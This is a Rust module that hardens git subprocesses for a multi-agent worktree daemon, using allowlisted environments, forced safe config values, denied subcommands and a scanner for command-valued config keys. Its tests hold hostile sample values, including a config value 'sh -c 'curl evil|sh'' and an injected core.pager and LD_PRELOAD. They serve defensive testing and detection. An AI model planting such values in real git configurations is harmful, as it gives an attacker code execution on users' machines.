//! Construction of `git` invocations that cannot be steered by repository content.
//!
//! # What was measured
//!
//! `docs/M0-FINDINGS.md` records three properties of `git worktree` that were confirmed by
//! running them on this machine, not by reading documentation:
//!
//! * `git worktree add` executes `.git/hooks/post-checkout`. Creating a worktree is our
//!   most frequent privileged operation, and by default it runs whatever is in the shared
//!   hooks directory.
//! * `.git/config` is shared by every worktree. One agent writing `core.pager` once
//!   compromises every other agent and the user's own checkout, because `core.pager` is
//!   documented as being interpreted by the shell.
//! * `refs/stash` is shared. Two agents using `git stash` corrupt each other's work.
//!
//! # Why the environment is built rather than filtered
//!
//! `GIT_CONFIG_COUNT` / `GIT_CONFIG_KEY_<n>` / `GIT_CONFIG_VALUE_<n>` inject configuration
//! at git's *command* scope, which git treats as **protected configuration** — the same
//! trust level as `--global`, and the only scope in which keys such as `safe.directory`
//! take effect at all. Inheriting the environment and deleting the variables we happen to
//! remember is a denylist, and a denylist here fails open the first time git adds another
//! variable. So the environment is assembled from an allowlist and everything else,
//! `GIT_*` included, simply never exists.
//!
//! # Why the configuration is re-stated on every invocation
//!
//! Several git configuration values are commands. `core.pager`, `core.editor`,
//! `core.sshCommand`, `core.fsmonitor`, `core.gitProxy`, `credential.helper`,
//! `filter.<d>.clean` / `.smudge` (selected by an in-repo `.gitattributes`),
//! `diff.<d>.textconv` (which plain `git diff` is enough to trigger),
//! `uploadpack.packObjectsHook` and `alias.*` all name something that gets executed. Any
//! of them can be set in the shared `.git/config`. Command-line `-c` beats every
//! configuration file, so the safe values are restated on every single invocation instead
//! of being written once into a file that an agent can rewrite.
//!
//! Two of those cannot be overridden by name, and the honesty about that matters more
//! than a false sense of coverage:
//!
//! * `filter.<driver>.*` and `diff.<driver>.textconv` are keyed by a driver name the
//!   attacker chooses, so there is no key to override. What this module does instead:
//!   `--no-textconv` / `--no-ext-diff` are passed where git accepts them,
//!   `core.attributesFile` and `GIT_ATTR_NOSYSTEM` remove the out-of-repo attribute
//!   files, and [`is_dangerous_config_key`] plus [`scan_config_list_z`] let a caller
//!   inspect a repository's configuration and refuse to operate. The remaining defence is
//!   structural: `.git/` is outside every agent's write boundary (see
//!   [`crate::path_guard`]), so the driver definition cannot be planted in the first place.
//! * `alias.*` likewise has no fixed key, but git ignores an alias that shadows a built-in
//!   command, and every subcommand this daemon issues is a built-in.

use std::ffi::{OsStr, OsString};
use std::path::{Path, PathBuf};
use std::process::Command;

/// Refusals from this module are a bug in the caller or an attack, never a routine
/// condition, so they are all fatal to the invocation being built.
#[derive(Debug, thiserror::Error)]
pub enum GitEnvError {
    #[error("git subcommand `{subcommand}` is not allowed: {reason}")]
    DeniedSubcommand {
        subcommand: String,
        reason: &'static str,
    },

    #[error("git argument `{argument}` is not allowed for `{subcommand}`: {reason}")]
    DeniedArgument {
        subcommand: String,
        argument: String,
        reason: &'static str,
    },

    #[error("configuration key `{key}` selects a command to execute and cannot be set by a caller")]
    DangerousConfigKey { key: String },

    #[error("no sandbox HOME was set; git must never be able to read the user's HOME")]
    MissingHome,

    #[error("argument is not valid UTF-8 and cannot be checked: {0:?}")]
    NonUtf8Argument(OsString),
}

/// Environment variables inherited from the daemon's own environment, and nothing else.
///
/// The absentees are the point: no `GIT_*`, no `LD_PRELOAD`, no `SSH_AUTH_SOCK` (an agent
/// that can reach the user's ssh agent can sign and push as the user), no
/// `GITHUB_TOKEN`-style credentials.
pub const INHERITED_ENV_ALLOWLIST: &[&str] = &[
    "PATH",
    "LANG",
    "LC_ALL",
    "LC_CTYPE",
    "TZ",
    // Some container images keep the CA bundle somewhere non-standard, and losing it
    // turns every https operation into a confusing certificate error.
    "SSL_CERT_FILE",
    "SSL_CERT_DIR",
];

/// Used when the daemon itself was started without `PATH`.
const FALLBACK_PATH: &str = "/usr/local/bin:/usr/bin:/bin";

/// Safe values for every configuration key that names something git will execute, applied
/// at command scope so they beat the shared `.git/config`.
pub const HARDENING_CONFIG: &[(&str, &str)] = &[
    // Measured: `git worktree add` runs post-checkout out of the shared hooks directory.
    // A path that is not a directory makes every hook lookup miss.
    ("core.hooksPath", "/dev/null"),
    // `file://` and local-path transports let a repository pull objects from, and run
    // upload-pack out of, a path the repository itself names. CVE-2022-39253 territory.
    ("protocol.file.allow", "never"),
    // Symlinks are written as plain files containing their target text instead of being
    // materialised. A checkout therefore cannot plant a link out of the worktree for a
    // later operation to follow, and the guard in `path_guard` refuses to traverse
    // symlinks anyway, so honouring them here would only create disagreement between the
    // two layers.
    ("core.symlinks", "false"),
    ("core.pager", "cat"),
    ("core.editor", "false"),
    // The `rebase -i` / `commit --amend` instruction-sheet editor is a separate key.
    ("sequence.editor", "false"),
    // Breaks ssh transports on purpose: this builder is for local repository work. A
    // future remote-capable builder has to opt in explicitly rather than inherit the
    // ability by accident.
    ("core.sshCommand", "false"),
    ("core.fsmonitor", "false"),
    // Documented sentinel meaning "no proxy", as opposed to an empty string which is a
    // command name.
    ("core.gitProxy", "none"),
    // An empty value is git's documented way to reset the helper list, not a helper
    // called "".
    ("credential.helper", ""),
    ("core.askPass", ""),
    ("uploadpack.packObjectsHook", ""),
    ("core.alternateRefsCommand", ""),
    // Signature verification would need a real gpg; we do not verify signatures, and a
    // repository that sets this gets to run it otherwise.
    ("gpg.program", "false"),
    // Removes the out-of-repo attributes file, one of the two ways a filter or textconv
    // driver gets attached to paths. The in-repo `.gitattributes` is the other, and it
    // cannot be disabled — see the module docs.
    ("core.attributesFile", "/dev/null"),
];

/// Subcommands the daemon will not run, with the reason recorded next to them.
const DENIED_SUBCOMMANDS: &[(&str, &str)] = &[
    (
        "stash",
        "refs/stash is shared across every worktree (measured), so concurrent agents \
         would overwrite each other's stashes",
    ),
    (
        "difftool",
        "runs the command named by difftool.<t>.cmd from the shared .git/config",
    ),
    (
        "mergetool",
        "runs the command named by mergetool.<t>.cmd from the shared .git/config",
    ),
    (
        "filter-branch",
        "executes its arguments as shell for every commit",
    ),
    (
        "send-email",
        "executes sendemail.* programs and reaches the network",
    ),
    (
        "instaweb",
        "starts a web server named by instaweb.httpd",
    ),
    (
        "web--browse",
        "executes the browser named by browser.<b>.cmd",
    ),
    ("gui", "launches an interactive program"),
    ("citool", "launches an interactive program"),
];

/// Flags that make `git config` a read rather than a write.
const CONFIG_READ_FLAGS: &[&str] = &[
    "--get",
    "--get-all",
    "--get-regexp",
    "--get-urlmatch",
    "--get-color",
    "--get-colorbool",
    "--list",
    "-l",
];

/// A `git` invocation whose environment and configuration are built from nothing.
///
/// ```no_run
/// # use std::path::Path;
/// # use wkbd_sec::git_env::GitCommand;
/// let mut cmd = GitCommand::new("worktree")?
///     .home(Path::new("/run/wkbd/git-home"))
///     .current_dir(Path::new("/srv/project"))
///     .args(["add", "-b", "task-1", "/srv/worktrees/task-1", "HEAD"])
///     .build()?;
/// let status = cmd.status()?;
/// # Ok::<(), Box<dyn std::error::Error>>(())
/// ```
///
/// For async use, `tokio::process::Command` converts from the returned
/// [`std::process::Command`] with `From`.
#[derive(Debug, Clone)]
pub struct GitCommand {
    program: PathBuf,
    subcommand: String,
    args: Vec<OsString>,
    caller_config: Vec<(String, String)>,
    cwd: Option<PathBuf>,
    home: Option<PathBuf>,
    force_c_locale: bool,
}

impl GitCommand {
    /// Fails immediately for a denied subcommand, so a denial cannot be lost by a caller
    /// that ignores the result of a later builder step.
    pub fn new(subcommand: &str) -> Result<Self, GitEnvError> {
        deny_subcommand(subcommand, &[] as &[&str])?;
        Ok(GitCommand {
            program: PathBuf::from("git"),
            subcommand: subcommand.to_string(),
            args: Vec::new(),
            caller_config: Vec::new(),
            cwd: None,
            home: None,
            force_c_locale: false,
        })
    }

    /// Overrides the `git` binary. Only useful for tests and for deployments that pin an
    /// absolute path.
    pub fn program(mut self, program: impl Into<PathBuf>) -> Self {
        self.program = program.into();
        self
    }

    /// The sandbox HOME. Required: git reads `~/.gitconfig`, `~/.config/git/config`,
    /// `~/.ssh/` and the credential store out of HOME, and none of those may be the
    /// user's.
    pub fn home(mut self, home: impl Into<PathBuf>) -> Self {
        self.home = Some(home.into());
        self
    }

    pub fn current_dir(mut self, dir: impl Into<PathBuf>) -> Self {
        self.cwd = Some(dir.into());
        self
    }

    pub fn arg(mut self, arg: impl AsRef<OsStr>) -> Self {
        self.args.push(arg.as_ref().to_os_string());
        self
    }

    pub fn args<I, S>(mut self, args: I) -> Self
    where
        I: IntoIterator<Item = S>,
        S: AsRef<OsStr>,
    {
        self.args
            .extend(args.into_iter().map(|a| a.as_ref().to_os_string()));
        self
    }

    /// Adds a caller-supplied `-c key=value`.
    ///
    /// Refused for any key that names something to execute: the hardening entries are
    /// appended after these and would win regardless (git takes the last `-c` for a key),
    /// but silently ignoring an attempt to set `core.pager` would hide a caller bug that
    /// matters.
    pub fn config(mut self, key: &str, value: &str) -> Result<Self, GitEnvError> {
        if is_dangerous_config_key(key) {
            return Err(GitEnvError::DangerousConfigKey {
                key: key.to_string(),
            });
        }
        self.caller_config
            .push((key.to_string(), value.to_string()));
        Ok(self)
    }

    /// Pins `LC_ALL=C` for callers that parse git's output.
    pub fn force_c_locale(mut self) -> Self {
        self.force_c_locale = true;
        self
    }

    /// The full argument vector, `git` itself excluded. Exposed so tests and audit logs
    /// can see exactly what would run.
    pub fn argv(&self) -> Result<Vec<OsString>, GitEnvError> {
        deny_subcommand(&self.subcommand, &self.args)?;

        let mut argv: Vec<OsString> = Vec::new();
        // Authoritative regardless of any pager configuration.
        argv.push(OsString::from("--no-pager"));

        for (key, value) in &self.caller_config {
            argv.push(OsString::from("-c"));
            argv.push(OsString::from(format!("{key}={value}")));
        }
        // Last `-c` for a key wins, so the hardening set goes after the caller's.
        for (key, value) in HARDENING_CONFIG {
            argv.push(OsString::from("-c"));
            argv.push(OsString::from(format!("{key}={value}")));
        }

        argv.push(OsString::from(&self.subcommand));
        argv.extend(implicit_subcommand_flags(&self.subcommand).iter().map(OsString::from));
        argv.extend(self.args.iter().cloned());
        Ok(argv)
    }

    /// The environment, as an allowlist plus our own settings. Nothing is inherited that
    /// is not named in [`INHERITED_ENV_ALLOWLIST`].
    pub fn env(&self) -> Result<Vec<(OsString, OsString)>, GitEnvError> {
        let home = self.home.as_ref().ok_or(GitEnvError::MissingHome)?;
        Ok(sanitized_env(home, self.force_c_locale))
    }

    pub fn build(&self) -> Result<Command, GitEnvError> {
        let argv = self.argv()?;
        let env = self.env()?;

        let mut cmd = Command::new(&self.program);
        cmd.args(&argv);
        // env_clear before anything else: everything present afterwards was put there on
        // purpose.
        cmd.env_clear();
        for (key, value) in env {
            cmd.env(key, value);
        }
        if let Some(dir) = &self.cwd {
            cmd.current_dir(dir);
        }
        Ok(cmd)
    }
}

/// Flags forced onto specific subcommands because the corresponding configuration is
/// keyed by an attacker-chosen driver name and so cannot be overridden with `-c`.
fn implicit_subcommand_flags(subcommand: &str) -> &'static [&'static str] {
    match subcommand {
        // `diff.<driver>.textconv` runs on a plain `git diff`; `diff.external` and
        // `GIT_EXTERNAL_DIFF` replace the diff machinery outright.
        "diff" | "show" | "log" | "format-patch" | "diff-tree" | "diff-files"
        | "diff-index" => &["--no-ext-diff", "--no-textconv"],
        _ => &[],
    }
}

/// The environment for a git subprocess: an allowlist of inherited variables, plus the
/// settings that pin every configuration source to something we control.
pub fn sanitized_env(home: &Path, force_c_locale: bool) -> Vec<(OsString, OsString)> {
    let mut env: Vec<(OsString, OsString)> = Vec::new();

    for name in INHERITED_ENV_ALLOWLIST {
        if force_c_locale && matches!(*name, "LANG" | "LC_ALL" | "LC_CTYPE") {
            continue;
        }
        if let Some(value) = std::env::var_os(name) {
            env.push((OsString::from(*name), value));
        }
    }
    if !env.iter().any(|(k, _)| k == OsStr::new("PATH")) {
        env.push((OsString::from("PATH"), OsString::from(FALLBACK_PATH)));
    }
    if force_c_locale {
        env.push((OsString::from("LC_ALL"), OsString::from("C")));
    }

    let mut set = |k: &str, v: &OsStr| env.push((OsString::from(k), v.to_os_string()));

    set("HOME", home.as_os_str());
    // git reads $XDG_CONFIG_HOME/git/config as global configuration, so pointing HOME
    // somewhere safe is not on its own enough.
    set("XDG_CONFIG_HOME", home.join("xdg").as_os_str());
    set("GIT_CONFIG_NOSYSTEM", OsStr::new("1"));
    set("GIT_CONFIG_GLOBAL", OsStr::new("/dev/null"));
    set("GIT_CONFIG_SYSTEM", OsStr::new("/dev/null"));
    // Removes /etc/gitattributes, which can attach a filter or textconv driver to paths
    // just as well as an in-repo .gitattributes can.
    set("GIT_ATTR_NOSYSTEM", OsStr::new("1"));
    // A daemon has no terminal to prompt at; without this, a credential prompt is a hang
    // rather than an error.
    set("GIT_TERMINAL_PROMPT", OsStr::new("0"));
    set("GIT_ASKPASS", OsStr::new(""));
    set("SSH_ASKPASS", OsStr::new(""));
    set("GIT_PAGER", OsStr::new("cat"));
    set("GIT_EDITOR", OsStr::new("false"));
    set("TERM", OsStr::new("dumb"));

    env
}

/// The `-c key=value` pairs added to every invocation, flattened.
pub fn hardening_args() -> Vec<OsString> {
    let mut out = Vec::with_capacity(HARDENING_CONFIG.len() * 2);
    for (key, value) in HARDENING_CONFIG {
        out.push(OsString::from("-c"));
        out.push(OsString::from(format!("{key}={value}")));
    }
    out
}

/// Refuses subcommands whose effects cross worktree boundaries or which execute
/// configured commands.
pub fn deny_subcommand<S: AsRef<OsStr>>(subcommand: &str, args: &[S]) -> Result<(), GitEnvError> {
    let normalised = subcommand.trim().to_ascii_lowercase();
    if let Some((_, reason)) = DENIED_SUBCOMMANDS.iter().find(|(name, _)| *name == normalised) {
        return Err(GitEnvError::DeniedSubcommand {
            subcommand: subcommand.to_string(),
            reason,
        });
    }

    if normalised == "config" {
        let mut texts = Vec::with_capacity(args.len());
        for arg in args {
            let text = arg
                .as_ref()
                .to_str()
                .ok_or_else(|| GitEnvError::NonUtf8Argument(arg.as_ref().to_os_string()))?;
            texts.push(text);
        }
        for text in &texts {
            // --global and --system escape the repository entirely: whatever an agent
            // writes there applies to every future git process the user runs.
            if *text == "--global" || *text == "--system" {
                return Err(GitEnvError::DeniedArgument {
                    subcommand: subcommand.to_string(),
                    argument: (*text).to_string(),
                    reason: "writes configuration that outlives this repository",
                });
            }
        }
        let is_read = texts.iter().any(|t| CONFIG_READ_FLAGS.contains(t));
        if !is_read {
            if let Some(key) = texts.iter().find(|t| is_dangerous_config_key(t)) {
                // Even `--local` is shared: `.git/config` is common to every worktree
                // (measured), so one agent setting core.pager hits all of them.
                return Err(GitEnvError::DeniedArgument {
                    subcommand: subcommand.to_string(),
                    argument: (*key).to_string(),
                    reason: "would write a key that names a command to execute, into a \
                             config file shared by every worktree",
                });
            }
        }
    }

    Ok(())
}

/// Sections in which every key is dangerous.
const DANGEROUS_SECTIONS: &[&str] = &[
    // `alias.<name>` starting with `!` is a shell command. (Aliases cannot shadow
    // built-ins, which is the only reason this is not worse.)
    "alias",
    // `pager.<cmd>` is a shell pipeline, exactly like core.pager.
    "pager",
];

/// Two-part keys whose value is, or selects, something executed.
const DANGEROUS_EXACT: &[&str] = &[
    "core.pager",
    "core.editor",
    "core.sshcommand",
    "core.fsmonitor",
    "core.gitproxy",
    "core.hookspath",
    "core.askpass",
    "core.alternaterefscommand",
    "core.attributesfile",
    "core.symlinks",
    "core.protectntfs",
    "core.protecthfs",
    "credential.helper",
    "diff.external",
    "sequence.editor",
    "gpg.program",
    "uploadpack.packobjectshook",
    "init.templatedir",
    "safe.directory",
    "include.path",
    "instaweb.httpd",
    "web.browser",
];

/// `section.<subsection>.name` patterns, matched on section and final name so the
/// attacker-chosen middle part does not matter.
const DANGEROUS_SUBSECTION: &[(&str, &str)] = &[
    ("filter", "clean"),
    ("filter", "smudge"),
    ("filter", "process"),
    ("diff", "textconv"),
    ("diff", "command"),
    ("difftool", "cmd"),
    ("mergetool", "cmd"),
    ("merge", "driver"),
    ("trailer", "command"),
    ("remote", "uploadpack"),
    ("remote", "receivepack"),
    ("browser", "cmd"),
    ("guitool", "cmd"),
    ("includeif", "path"),
    ("credential", "helper"),
    ("gpg", "program"),
    ("protocol", "allow"),
    ("url", "insteadof"),
    ("url", "pushinsteadof"),
    ("submodule", "url"),
    ("submodule", "update"),
];

/// Splits a git configuration key into section, optional subsection and name.
///
/// The subsection is everything between the first and last dot and may itself contain
/// dots — `includeIf.gitdir:/x/y.z/.path` and `filter.my.driver.clean` are both real
/// shapes, and splitting on every dot gets them wrong.
fn split_config_key(key: &str) -> Option<(String, Option<&str>, String)> {
    let first = key.find('.')?;
    let last = key.rfind('.')?;
    let section = key[..first].to_ascii_lowercase();
    let name = key[last + 1..].to_ascii_lowercase();
    let subsection = if first == last {
        None
    } else {
        Some(&key[first + 1..last])
    };
    if section.is_empty() || name.is_empty() {
        return None;
    }
    Some((section, subsection, name))
}

/// Whether setting this configuration key hands over control of a command line.
///
/// Case handling follows git: section and name are case-insensitive, the subsection is
/// case-sensitive and is not examined here anyway.
pub fn is_dangerous_config_key(key: &str) -> bool {
    let Some((section, subsection, name)) = split_config_key(key) else {
        return false;
    };
    if DANGEROUS_SECTIONS.contains(&section.as_str()) {
        return true;
    }
    match subsection {
        None => DANGEROUS_EXACT.contains(&format!("{section}.{name}").as_str()),
        Some(_) => DANGEROUS_SUBSECTION
            .iter()
            .any(|(s, n)| *s == section && *n == name),
    }
}

/// A dangerous key found in a repository's effective configuration.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DangerousConfigEntry {
    pub key: String,
    pub value: String,
}

/// Scans the output of `git config --list -z` for keys that name a command.
///
/// `-z` matters: values can contain newlines, so the line-oriented output cannot be
/// parsed safely — a value containing `\ncore.pager=...` would otherwise read back as a
/// separate entry, or hide one.
pub fn scan_config_list_z(output: &[u8]) -> Vec<DangerousConfigEntry> {
    let mut found = Vec::new();
    for record in output.split(|b| *b == 0) {
        if record.is_empty() {
            continue;
        }
        let text = String::from_utf8_lossy(record);
        let (key, value) = match text.split_once('\n') {
            Some((key, value)) => (key, value),
            None => (text.as_ref(), ""),
        };
        if is_dangerous_config_key(key) {
            found.push(DangerousConfigEntry {
                key: key.to_string(),
                value: value.to_string(),
            });
        }
    }
    found
}

#[cfg(test)]
mod tests {
    use super::*;

    fn argv_strings(cmd: &GitCommand) -> Vec<String> {
        cmd.argv()
            .unwrap()
            .iter()
            .map(|a| a.to_string_lossy().into_owned())
            .collect()
    }

    #[test]
    fn hooks_are_disabled_on_every_invocation() {
        let cmd = GitCommand::new("worktree").unwrap().home("/tmp/h");
        let argv = argv_strings(&cmd);
        assert!(argv.contains(&"core.hooksPath=/dev/null".to_string()), "{argv:?}");
        assert!(argv.contains(&"protocol.file.allow=never".to_string()), "{argv:?}");
        assert!(argv.contains(&"core.symlinks=false".to_string()), "{argv:?}");
        assert!(argv.contains(&"--no-pager".to_string()), "{argv:?}");
    }

    #[test]
    fn every_value_is_command_key_has_a_safe_value() {
        let argv = argv_strings(&GitCommand::new("status").unwrap().home("/tmp/h"));
        for key in [
            "core.pager",
            "core.editor",
            "core.sshCommand",
            "core.fsmonitor",
            "core.gitProxy",
            "credential.helper",
            "uploadpack.packObjectsHook",
            "sequence.editor",
            "gpg.program",
        ] {
            assert!(
                argv.iter().any(|a| a.starts_with(&format!("{key}="))),
                "{key} is not overridden: {argv:?}"
            );
        }
    }

    #[test]
    fn hardening_wins_over_caller_supplied_config() {
        // git takes the last -c for a given key, so ordering is the mechanism here.
        let cmd = GitCommand::new("status")
            .unwrap()
            .home("/tmp/h")
            .config("user.name", "wkbd")
            .unwrap();
        let argv = argv_strings(&cmd);
        let user = argv.iter().position(|a| a == "user.name=wkbd").unwrap();
        let hooks = argv
            .iter()
            .position(|a| a == "core.hooksPath=/dev/null")
            .unwrap();
        assert!(user < hooks, "caller config must come first: {argv:?}");
    }

    #[test]
    fn diff_subcommands_disable_driver_selected_programs() {
        let argv = argv_strings(&GitCommand::new("diff").unwrap().home("/tmp/h"));
        assert!(argv.contains(&"--no-textconv".to_string()), "{argv:?}");
        assert!(argv.contains(&"--no-ext-diff".to_string()), "{argv:?}");

        let argv = argv_strings(&GitCommand::new("worktree").unwrap().home("/tmp/h"));
        assert!(!argv.contains(&"--no-textconv".to_string()), "{argv:?}");
    }

    #[test]
    fn injected_git_variables_do_not_survive() {
        // The command-scope injection vector: these three would set configuration at
        // git's protected scope, which is the only scope where safe.directory works.
        std::env::set_var("GIT_CONFIG_COUNT", "1");
        std::env::set_var("GIT_CONFIG_KEY_0", "core.pager");
        std::env::set_var("GIT_CONFIG_VALUE_0", "touch /tmp/pwned");
        std::env::set_var("GIT_DIR", "/tmp/evil.git");
        std::env::set_var("LD_PRELOAD", "/tmp/evil.so");
        std::env::set_var("SSH_AUTH_SOCK", "/tmp/agent.sock");

        let env = sanitized_env(Path::new("/tmp/sandbox-home"), false);
        let names: Vec<String> = env
            .iter()
            .map(|(k, _)| k.to_string_lossy().into_owned())
            .collect();

        for forbidden in [
            "GIT_CONFIG_COUNT",
            "GIT_CONFIG_KEY_0",
            "GIT_CONFIG_VALUE_0",
            "GIT_DIR",
            "LD_PRELOAD",
            "SSH_AUTH_SOCK",
        ] {
            assert!(
                !names.contains(&forbidden.to_string()),
                "{forbidden} survived: {names:?}"
            );
        }

        let lookup = |want: &str| {
            env.iter()
                .find(|(k, _)| k == OsStr::new(want))
                .map(|(_, v)| v.to_string_lossy().into_owned())
        };
        assert_eq!(lookup("HOME").as_deref(), Some("/tmp/sandbox-home"));
        assert_eq!(
            lookup("XDG_CONFIG_HOME").as_deref(),
            Some("/tmp/sandbox-home/xdg")
        );
        assert_eq!(lookup("GIT_CONFIG_NOSYSTEM").as_deref(), Some("1"));
        assert_eq!(lookup("GIT_CONFIG_GLOBAL").as_deref(), Some("/dev/null"));
        assert!(lookup("PATH").is_some(), "PATH must still be inherited");

        std::env::remove_var("GIT_CONFIG_COUNT");
        std::env::remove_var("GIT_CONFIG_KEY_0");
        std::env::remove_var("GIT_CONFIG_VALUE_0");
        std::env::remove_var("GIT_DIR");
        std::env::remove_var("LD_PRELOAD");
        std::env::remove_var("SSH_AUTH_SOCK");
    }

    #[test]
    fn stash_is_denied() {
        let err = GitCommand::new("stash").unwrap_err();
        assert!(matches!(err, GitEnvError::DeniedSubcommand { .. }), "{err}");
        assert!(err.to_string().contains("shared"), "{err}");
        assert!(deny_subcommand("stash", &["list"]).is_err());
        // Case and whitespace must not be a bypass.
        assert!(GitCommand::new("STASH").is_err());
        assert!(GitCommand::new(" stash ").is_err());
    }

    #[test]
    fn config_writes_outside_the_repository_are_denied() {
        let denied = GitCommand::new("config")
            .unwrap()
            .home("/tmp/h")
            .args(["--global", "core.pager", "evil"])
            .argv();
        assert!(matches!(
            denied,
            Err(GitEnvError::DeniedArgument { .. })
        ));

        let denied = GitCommand::new("config")
            .unwrap()
            .home("/tmp/h")
            .args(["--system", "user.name", "x"])
            .argv();
        assert!(denied.is_err());

        // Local writes of a command-valued key are denied too: .git/config is shared by
        // every worktree.
        let denied = GitCommand::new("config")
            .unwrap()
            .home("/tmp/h")
            .args(["core.pager", "evil"])
            .argv();
        assert!(denied.is_err());

        // Reading is allowed, including reading a dangerous key, which is how a caller
        // audits a repository.
        let allowed = GitCommand::new("config")
            .unwrap()
            .home("/tmp/h")
            .args(["--get", "core.pager"])
            .argv();
        assert!(allowed.is_ok(), "{allowed:?}");

        let allowed = GitCommand::new("config")
            .unwrap()
            .home("/tmp/h")
            .args(["user.name", "wkbd"])
            .argv();
        assert!(allowed.is_ok(), "{allowed:?}");
    }

    #[test]
    fn callers_cannot_set_command_valued_config() {
        let err = GitCommand::new("status")
            .unwrap()
            .config("core.pager", "sh -c evil")
            .unwrap_err();
        assert!(matches!(err, GitEnvError::DangerousConfigKey { .. }), "{err}");
    }

    #[test]
    fn build_requires_a_sandbox_home() {
        let err = GitCommand::new("status").unwrap().build().unwrap_err();
        assert!(matches!(err, GitEnvError::MissingHome), "{err}");
    }

    #[test]
    fn dangerous_key_classification() {
        for key in [
            "core.pager",
            "CORE.PAGER",
            "core.sshCommand",
            "core.fsmonitor",
            "core.gitProxy",
            "credential.helper",
            "credential.https://example.com.helper",
            "filter.lfs.clean",
            "filter.lfs.smudge",
            "filter.my.long.driver.process",
            "diff.jupyter.textconv",
            "uploadpack.packObjectsHook",
            "alias.co",
            "alias.anything",
            "pager.diff",
            "includeIf.gitdir:/x/.path",
            "url.https://evil.example/.insteadOf",
            "sequence.editor",
            "safe.directory",
            "include.path",
        ] {
            assert!(is_dangerous_config_key(key), "{key} should be dangerous");
        }
        for key in [
            "user.name",
            "user.email",
            "commit.gpgsign",
            "diff.algorithm",
            "merge.conflictstyle",
            "branch.main.remote",
            "remote.origin.url",
            "core.bare",
            "",
            "nodots",
        ] {
            assert!(!is_dangerous_config_key(key), "{key} should be allowed");
        }
    }

    #[test]
    fn config_scan_reads_nul_separated_records() {
        // The value of `user.name` contains a newline and a decoy key; line-oriented
        // parsing would report the decoy as a separate entry and miss nothing, but a
        // scanner that trusts it can equally be made to miss a real one.
        let mut output: Vec<u8> = Vec::new();
        output.extend_from_slice(b"user.name\nnot core.pager=evil\0");
        output.extend_from_slice(b"core.pager\nsh -c 'curl evil|sh'\0");
        output.extend_from_slice(b"filter.lfs.clean\ngit-lfs clean\0");
        output.extend_from_slice(b"core.bare\nfalse\0");

        let found = scan_config_list_z(&output);
        assert_eq!(
            found,
            vec![
                DangerousConfigEntry {
                    key: "core.pager".to_string(),
                    value: "sh -c 'curl evil|sh'".to_string(),
                },
                DangerousConfigEntry {
                    key: "filter.lfs.clean".to_string(),
                    value: "git-lfs clean".to_string(),
                },
            ]
        );
    }
}
